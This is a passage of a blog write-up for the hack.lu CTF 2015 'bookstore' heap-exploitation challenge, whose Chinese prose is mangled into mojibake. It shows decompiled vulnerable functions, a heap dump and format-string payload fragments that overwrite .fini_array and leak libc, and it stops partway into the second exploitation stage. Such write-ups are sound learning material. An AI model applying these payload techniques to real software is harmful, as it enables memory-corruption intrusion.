<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>hack.lu ctf 2015 bookstore | V1NKeçš„å¿ƒæƒ…åƒåœ¾æ¡¶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="PWN," />
  

  <meta name="description" content="PWN,CTF">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="hack.lu ctf 2015 bookstore">
<meta property="og:url" content="http://yoursite.com/2018/09/11/hack.lu ctf 2015 bookstore/index.html">
<meta property="og:site_name" content="V1NKeçš„å¿ƒæƒ…åƒåœ¾æ¡¶">
<meta property="og:description" content="PWN,CTF">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/å±å¹•å¿«ç…§%202018-09-11%20ä¸‹åˆ6.23.40.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/å±å¹•å¿«ç…§%202018-09-11%20ä¸‹åˆ7.29.52.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/å±å¹•å¿«ç…§%202018-09-11%20ä¸‹åˆ8.20.56.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/å±å¹•å¿«ç…§%202018-09-11%20ä¸‹åˆ8.21.19.png">
<meta property="og:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/å±å¹•å¿«ç…§%202018-09-11%20ä¸‹åˆ9.16.26.png">
<meta property="og:updated_time" content="2018-09-11T13:49:27.855Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hack.lu ctf 2015 bookstore">
<meta name="twitter:description" content="PWN,CTF">
<meta name="twitter:image" content="http://yoursite.com/hack.lu%20ctf%202015%20bookstore/å±å¹•å¿«ç…§%202018-09-11%20ä¸‹åˆ6.23.40.png">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">ç›’å­</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">ç›’å­</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            åšå®¢
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            æ ‡ç­¾
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            rel="noopener noreferrer"
            target="_self"
            >
            å‹é“¾
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            å…³äº
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">æ–‡ç« ç›®å½•</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#å‰è¨€-ï¼š"><span class="toc-text">å‰è¨€ ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#æ¦‚è¿°-ï¼š"><span class="toc-text">æ¦‚è¿° ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#è¯¦è§£-ï¼š"><span class="toc-text">è¯¦è§£ ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#åŠŸèƒ½-ï¼š"><span class="toc-text">åŠŸèƒ½ ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¼æ´-ï¼š"><span class="toc-text">æ¼æ´ ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ©ç”¨-ï¼š"><span class="toc-text">åˆ©ç”¨ ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#å…ˆæ¥ç¬¬ä¸€é˜¶æ®µçš„åˆ©ç”¨-ï¼š"><span class="toc-text">å…ˆæ¥ç¬¬ä¸€é˜¶æ®µçš„åˆ©ç”¨ ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ç¬¬äºŒé˜¶æ®µçš„åˆ©ç”¨-ï¼š"><span class="toc-text">ç¬¬äºŒé˜¶æ®µçš„åˆ©ç”¨ ï¼š</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ç»“æœ-ï¼š"><span class="toc-text">ç»“æœ ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-ï¼š"><span class="toc-text">EXP ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ç›¸å…³é“¾æ¥ï¼š"><span class="toc-text">ç›¸å…³é“¾æ¥ï¼š</span></a></li></ol></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-hack.lu ctf 2015 bookstore" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">hack.lu ctf 2015 bookstore</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2018.09.11</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbspçƒ­åº¦ <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>â„ƒ
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="å‰è¨€-ï¼š"><a href="#å‰è¨€-ï¼š" class="headerlink" title="å‰è¨€ ï¼š"></a>å‰è¨€ ï¼š</h2><p>æˆ‘æ˜¯çœŸçš„æ‡’ã€‚ã€‚è‡ªä»å…­æœˆé¢“äº†ä¹‹åå†è¿‡ä¸€ä¸ªæš‘å‡æ•´ä¸ªäººåŸºæœ¬ä¸Šç®—æ˜¯åºŸç‰©çŠ¶æ€ã€‚ã€‚è¿˜å¥½æœ€è¿‘è¿›åº¦æ…¢æ…¢èµ·æ­¥ä¸Šæ¥äº†ï¼Œä¸ç„¶å¾—å®Œè›‹äº†ï¼Œè¿™é“é¢˜èŠ±äº†æˆ‘ä¸¤å¤©æ‰è§£å‡ºæ¥ï¼Œæ„Ÿè§‰è‡ªå·±æ˜¯çœŸçš„èœï¼Œä½†æ˜¯è§£å‡ºæ¥çš„ç¬é—´çœŸçš„æ˜¯å·¨ä»–å¦ˆå¿«ä¹ï¼Œè€Œä¸”ç°åœ¨è¿˜æ²¡æœ‰äººå†™è¿‡å®Œæ•´ä¸”æ­£å¸¸çš„writeupï¼Œæ‰€ä»¥æˆ‘è§‰å¾—æˆ‘æ˜¯ç¬¬ä¸€äººï¼Œå°±å·¨ä»–å¦ˆçš„å¼€å¿ƒã€‚</p>
<h2 id="æ¦‚è¿°-ï¼š"><a href="#æ¦‚è¿°-ï¼š" class="headerlink" title="æ¦‚è¿° ï¼š"></a>æ¦‚è¿° ï¼š</h2><p>15å¹´çš„ä¸€é“é¢˜ï¼Œå°è¯•è§£é¢˜æ— æœä¹‹åå»æœäº†æœwriteupï¼Œç»“æœå¹¶æ²¡æœ‰æœåˆ°ã€‚ã€‚åªæœ‰ä¸€ç¯‡éæ­£å¸¸getshellçš„æ–‡ç« ã€‚ã€‚ä½œè€…æ‰“æ¯”èµ›æ—¶å€™é ç€æœ¬æœºç¯å¢ƒå’Œæ¯”èµ›æœºä¸€è‡´ï¼Œé ç€è®¾å®šå¥½systemåœ°å€getshellã€‚çœ‹çš„æˆ‘ä¸€è„¸æ‡µï¼Œè¿˜æ˜¯é è‡ªå·±è§£å§ã€‚ã€‚è‚äº†ä¸€å¤©å¤šç»ˆäºè‚å‡ºæ¥äº†ã€‚ã€‚æœ¬èœğŸ”è¿˜æ˜¯èœå•Šã€‚ã€‚</p>
<p>è¿™é“é¢˜è™½ç„¶çœ‹ä¼¼æ¼æ´å¾ˆå¤šï¼Œä½†æ˜¯è¦åˆ©ç”¨èµ·æ¥è¿˜çœŸæ˜¯æœ‰ç‚¹å›°éš¾ã€‚</p>
<h2 id="è¯¦è§£-ï¼š"><a href="#è¯¦è§£-ï¼š" class="headerlink" title="è¯¦è§£ ï¼š"></a>è¯¦è§£ ï¼š</h2><p>checksecï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  books checksec ./books </span><br><span class="line">[*] &apos;/home/parallels/Desktop/PWN/PwnWiKi/heap/books/books&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="åŠŸèƒ½-ï¼š"><a href="#åŠŸèƒ½-ï¼š" class="headerlink" title="åŠŸèƒ½ ï¼š"></a>åŠŸèƒ½ ï¼š</h3><p>è¯¥ç¨‹åºæ˜¯ä¸ªä¹¦åº—ï¼Œè®¢ä¹¦çš„åŠŸèƒ½ï¼Œæœ€å¤šè®¢è´­ä¸¤æœ¬ä¹¦ï¼Œè®¢è´­æ¯æœ¬ä¹¦çš„æ—¶å€™å¯ä»¥å¡«å†™è®¢å•å†…å®¹ï¼Œè¿™é‡Œé¢å¯ä»¥æ— é™åˆ¶ä»»æ„å†™ï¼Œç„¶åæ˜¯åˆ é™¤è®¢å•ï¼Œåˆ é™¤è®¢å•ä¸­åª<code>free</code>æ‰äº†æŒ‡é’ˆï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆç½®ä¸ºNULLï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œä¸”æŒ‡é’ˆçš„ä½ç½®å¤„äºæ ˆåœ°å€ä¸Šï¼Œæœ€åæ˜¯ä¸€ä¸ªæäº¤åŠŸèƒ½ï¼Œæäº¤åŠŸèƒ½æ˜¯å°†ä¸¤æœ¬ä¹¦çš„å†…å®¹åˆåœ¨ä¸€èµ·æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯æäº¤åå­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ã€‚</p>
<h3 id="æ¼æ´-ï¼š"><a href="#æ¼æ´-ï¼š" class="headerlink" title="æ¼æ´ ï¼š"></a>æ¼æ´ ï¼š</h3><ol>
<li>ä»»æ„å†™ï¼Œå †æº¢å‡ºæ¼æ´ï¼š</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400876(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line">  int v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  int v4; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v5; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v4 = 0;</span><br><span class="line">  while ( v3 != &apos;\n&apos; )      &lt;----------------æ¢è¡Œç¬¦æ‰ç»“æŸå¾ªç¯ï¼Œä»»æ„å†™</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetc(stdin);</span><br><span class="line">    v1 = v4++;</span><br><span class="line">    *(_BYTE *)(v1 + a1) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v4 - 1LL + a1) = 0;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>UAFæ¼æ´ï¼š</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_4008FA(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v1; // ST18_8</span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(0x28u);</span><br><span class="line">  free(a1);                &lt;-----------------æ²¡æœ‰å°†æŒ‡é’ˆç½®ä¸ºNULL</span><br><span class="line">  return __readfsqword(0x28u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%s&quot;, v5);</span><br><span class="line">printf(dest);            &lt;-----------------æ ¼å¼åŒ–å­—ç¬¦ä¸²</span><br><span class="line">return 0LL;</span><br></pre></td></tr></table></figure>
<h3 id="åˆ©ç”¨-ï¼š"><a href="#åˆ©ç”¨-ï¼š" class="headerlink" title="åˆ©ç”¨ ï¼š"></a>åˆ©ç”¨ ï¼š</h3><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ¼æ´çœ‹èµ·æ¥è¿™ä¹ˆçš„å¤šï¼Œæ€ä¹ˆå»åˆ©ç”¨ï¼Ÿé¦–å…ˆæˆ‘ä»¬å¾—æ³¨æ„ä¸‰ç‚¹ï¼š</p>
<ol>
<li>ä½¿ç”¨submitåŠŸèƒ½çš„æ—¶å€™ç¨‹åºå°±ç»“æŸäº†ï¼Œä¹Ÿå°±æ˜¯ä¸€æ¬¡æ€§ï¼Œä½†æ˜¯<code>printf</code>æ ¼å¼åŒ–æ°å¥½å°±åœ¨ç¨‹åºç»“æŸå¤„æ‰äº§ç”Ÿã€‚</li>
<li>æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ä»ç³»ç»Ÿ<code>malloc</code>çš„ç¬¬ä¸‰å—å †å†…å®¹ä¸­è·å–ã€‚</li>
<li>æ— æ³•è‡ªè¡Œåˆ†é…å †ï¼Œåªèƒ½ä»ç¨‹åºæœ¬èº«ç”³è¯·çš„ä¸‰å—å †å’ŒsubmitåŠŸèƒ½ä¸­ç”³è¯·çš„å †ä¸­å»åˆ©ç”¨ã€‚</li>
</ol>
<p>ä½†æ˜¯æˆ‘ä»¬ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬æƒ³ç”¨æº¢å‡ºæ§åˆ¶ç¬¬ä¸‰å—å †ä¸­çš„å†…å®¹å†åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™ä¼šé‡åˆ°å¡«å†™è®¢å•å†…å®¹åè¢«<code>strcpy</code>å‡½æ•°ç»™é‡æ–°è¦†ç›–æ‰ç¬¬ä¸‰å †å—çš„å†…å®¹ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬åº”å½“ä½¿ç”¨åˆ°Overlappingï¼Œå…ˆ<code>delete</code>ç¬¬äºŒå †å—ï¼Œå†ç”¨å †å—ä¸€æº¢å‡ºå †å—äºŒçš„<code>size</code>å­—æ®µä¸º<code>0x151</code>ï¼Œè¿™æ ·å½“åˆ©ç”¨<code>submit</code>åŠŸèƒ½çš„æ—¶å€™æ‰€ç”³è¯·çš„<code>0x140</code>å †å—å°±èƒ½å‡ºç°åœ¨å †å—äºŒçš„ä½ç½®ä¸Šï¼Œéšåä¾¿èƒ½åˆ©ç”¨<code>submit</code>åˆå¹¶ä¸¤ä¸ªå †å—å†…å®¹çš„ä½œç”¨è¦†ç›–åˆ°ç¬¬ä¸‰å †å—ï¼Œå¦‚æœæ„é€ å¥½è¦†ç›–å†…å®¹ï¼Œæˆ‘ä»¬ä¾¿èƒ½åœ¨ç¨‹åºæœ€ååˆ©ç”¨åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å†…å®¹ã€‚</p>
<p>æ˜¾ç„¶ï¼Œä¸€æ¬¡åˆ©ç”¨å¹¶ä¸èƒ½è¾¾åˆ°æˆ‘ä»¬getshellçš„ç›®çš„ï¼Œè¿™é‡Œ<strong>ç”¨åˆ°è¿™ä¹ˆä¸€ä¸ªçŸ¥è¯†ç‚¹ :</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¨‹åºé€€å‡ºåä¼šæ‰§è¡Œ`.fini_array`åœ°å€å¤„çš„å‡½æ•°ï¼Œä¸è¿‡åªèƒ½åˆ©ç”¨ä¸€æ¬¡ã€‚</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†<code>.fini_array</code>åœ°å€å¤„çš„å‡½æ•°ä¿®æ”¹æˆ<code>main</code>å‡½æ•°çš„åœ°å€ï¼Œä½¿ç¨‹åºé‡æ–°å›åˆ°<code>main</code>å‡½æ•°ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³„æ¼<code>libc</code>åœ°å€ã€‚</p>
<h4 id="å…ˆæ¥ç¬¬ä¸€é˜¶æ®µçš„åˆ©ç”¨-ï¼š"><a href="#å…ˆæ¥ç¬¬ä¸€é˜¶æ®µçš„åˆ©ç”¨-ï¼š" class="headerlink" title="å…ˆæ¥ç¬¬ä¸€é˜¶æ®µçš„åˆ©ç”¨ ï¼š"></a>å…ˆæ¥ç¬¬ä¸€é˜¶æ®µçš„åˆ©ç”¨ ï¼š</h4><p><code>delete</code>æ‰å †å—äºŒï¼š</p>
<p><img src="/hack.lu ctf 2015 bookstore/å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ6.23.40.png" alt="å±å¹•å¿«ç…§ 2018-09-11 ä¸‹åˆ6.23.40"></p>
<p>åˆ©ç”¨å †å—ä¸€è¦†ç›–é‡å†™çš„è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬æ‰€æ„é€ çš„<code>payload</code>éœ€è¦å’Œåé¢åˆ©ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€åŒ¹é…ã€‚</p>
<p>å †å—ä½ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0x602000:	0x0000000000000000	0x0000000000000091 &lt;--å †å—ä¸€å¤´</span><br><span class="line">0x602010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000091 &lt;--æ–°ç”³è¯·çš„0x140å †å—å¤´</span><br><span class="line">0x6020a0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78 </span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602120:	0x0000000000000090	0x0000000000000090 &lt;--destå †å—å¤´(printfå¤„)</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602180:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602190:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6021b0:	0x0000000000000000	0x0000000000000411</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬éœ€è¦è®©<code>printf</code>å †å—å¤„æ‰§è¡Œæ ¼å¼åŒ–çš„æ¼æ´ï¼Œå°±éœ€è¦è®©<code>submit</code>åŠŸèƒ½å»å¸®åŠ©æˆ‘ä»¬è¦†ç›–ï¼Œ<code>submit</code>åŠŸèƒ½ä¼šåŠ ä¸Š<code>order1:</code>ç­‰è¿™äº›å­—ç¬¦ä¸²ï¼Œä¸èƒ½æ¼æ‰ï¼Œæ€»ç»“åå¯ä»¥å¾—çŸ¥æ–°ç”³è¯·çš„å †å—å†…å®¹ä¸ºï¼š</p>
<blockquote>
<p><code>Order 1:</code> + <code>chunk1</code> + <code>\n</code> + <code>Order 2:</code> + <code>chunk2</code> + <code>\n</code></p>
</blockquote>
<p>å› ä¸º<code>chunk2</code>å·²ç»è¢«<code>delete</code>æ‰äº†ï¼Œæ‰€ä»¥å½“å¤åˆ¶<code>chunk2</code>ä¸­çš„å†…å®¹çš„æ—¶å€™å¤åˆ¶çš„å…¶å®æ˜¯<code>order 1: + chunk1</code>ã€‚æ‰€ä»¥ä¸Šè¿°å¯ä»¥å˜ä¸ºï¼š</p>
<blockquote>
<p><code>Order 1:</code> + <code>chunk1</code> + <code>\n</code> + <code>Order 2:</code> + <code>Order 1:</code> + <code>chunk1</code> + <code>\n</code></p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ç¬¬äºŒæ¬¡çš„<code>chunk1</code>å†…å®¹æ°å¥½è¦†ç›–åˆ°<code>dest</code>å †å—å¤„ã€‚ä¹Ÿå°±æ˜¯ï¼š</p>
<blockquote>
<p>size(<code>Order 1:</code> + <code>chunk1</code> + <code>\n</code> + <code>Order 2:</code> + <code>Order 1:</code>)  == <code>0x90</code></p>
</blockquote>
<blockquote>
<p>size(<code>chunk1</code>) == <code>0x90 - 28</code> == <code>0x74</code></p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬æ„é€ <code>chunk1</code>ä¸­çš„å†…å®¹çš„æ—¶å€™åªè¦ä½¿å…¶ä¸­é<code>0</code>å­—ç¬¦ä¸²çš„ä¸ªæ•°è¾¾åˆ°<code>0x74</code>å°±è¡Œäº†ã€‚</p>
<p>å› ä¸ºè¾“å…¥é€‰é¡¹çš„æ—¶å€™å¯è¾“å…¥<code>128</code>ä¸ªæ•°å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, 128, stdin);</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æå‰åœ¨æ ˆä¸­æ„é€ å¥½æˆ‘ä»¬æ‰€éœ€è¦ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹çš„ä»»æ„åœ°å€ã€‚</p>
<p>è¾“å…¥ç‚¹åœ¨æ ¼å¼åŒ–åç§»ä¸º12å¤„ï¼Œæˆ‘ä»¬ç¬¬ä¸€è½®åˆ©ç”¨éœ€è¦ä¿®æ”¹çš„æ˜¯<code>.fini_array</code>å¤„çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ ˆä¸­å¯ä»¥è¿™ä¹ˆæ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;5&apos;+p8(0x0)*7 + p64(fini_array)  &lt;-- 5ä¸ºé€‰ç”¨submitåŠŸèƒ½</span><br></pre></td></tr></table></figure>
<p>è€Œ<code>chunk1</code>ä¸­çš„å†…å®¹å¯ä»¥è¿™ä¹ˆæ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;%&quot;+str(2617)+&quot;c%13$hn&quot;  + &apos;.%31$p&apos; + &apos;,%28$p&apos;</span><br><span class="line">payload += &apos;A&apos;*(0x74-len(payload))</span><br><span class="line">payload += p8(0x0)*(0x88-len(payload))</span><br><span class="line">payload += p64(0x151)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>&#39;.%31$p&#39;</code>ç›®çš„æ˜¯æ³„æ¼<code>__libc_start_main</code>å‡½æ•°çš„åœ°å€ï¼Œä»è€Œ<code>leak libc</code>çš„åœ°å€ã€‚è€Œè¿™é‡Œçš„<code>&#39;,%28$p&#39;</code>ç›®çš„æˆ‘åé¢ä¼šè¯´åˆ°ã€‚</p>
<h4 id="ç¬¬äºŒé˜¶æ®µçš„åˆ©ç”¨-ï¼š"><a href="#ç¬¬äºŒé˜¶æ®µçš„åˆ©ç”¨-ï¼š" class="headerlink" title="ç¬¬äºŒé˜¶æ®µçš„åˆ©ç”¨ ï¼š"></a>ç¬¬äºŒé˜¶æ®µçš„åˆ©ç”¨ ï¼š</h4><p>è¿™é‡Œæˆ‘ä»¬èƒ½æ€ä¹ˆæ¥ä¸‹å»åˆ©ç”¨å‘¢ï¼Ÿ<code>ctf-wiki</code>ä¸Šçš„è§£æ³•æ˜¯æ‹¿åˆ°<code>system</code>å‡½æ•°çš„åœ°å€åå»è¦†ç›–<code>free_got</code>ã€‚æˆ‘è¯•äº†è¿™è§£æ³•åæ‰çŸ¥é“è¿™è§£æ³•è¿˜éœ€è¦å†æ¥ä¸€è½®å»è§¦å‘<code>free</code>å‡½æ•°ã€‚ã€‚æ‰€ä»¥è¿™ä¸ªæ€è·¯è¡Œä¸é€šã€‚ã€‚<code>wiki</code>ä¸Šè´´çš„<code>exp</code>å¥½åƒåªæ‰§è¡Œäº†ç¬¬ä¸€é˜¶æ®µï¼Œç¬¬äºŒé˜¶æ®µçš„åˆ©ç”¨æ²¡æœ‰ã€‚ã€‚</p>
<p>æœç´¢åˆ°çš„å”¯ä¸€ä¸€ä¸ª<code>exp</code>æ˜¯é€šè¿‡è®¾å®š<code>system</code>åœ°å€ä½›ç³»<code>getshell</code>çš„ã€‚ã€‚æ‰€ä»¥è¿˜æ˜¯å¾—è‡ªå·±æ¥ç€æ‰‹ã€‚ã€‚æˆ‘æƒ³è¿™é¢˜ç›®è‚¯å®šæ˜¯æœ‰ä¸€ä¸ªå¸¸è§„è§£çš„ã€‚æ‰€ä»¥æˆ‘è‡ªå·±æ¥è‚ã€‚ã€‚</p>
<p><strong>æˆ‘çš„æ€è·¯æ˜¯é€šè¿‡ç¬¬äºŒé˜¶æ®µä¿®æ”¹ä¸»å‡½æ•°è¿”å›åœ°å€getshellï¼š</strong></p>
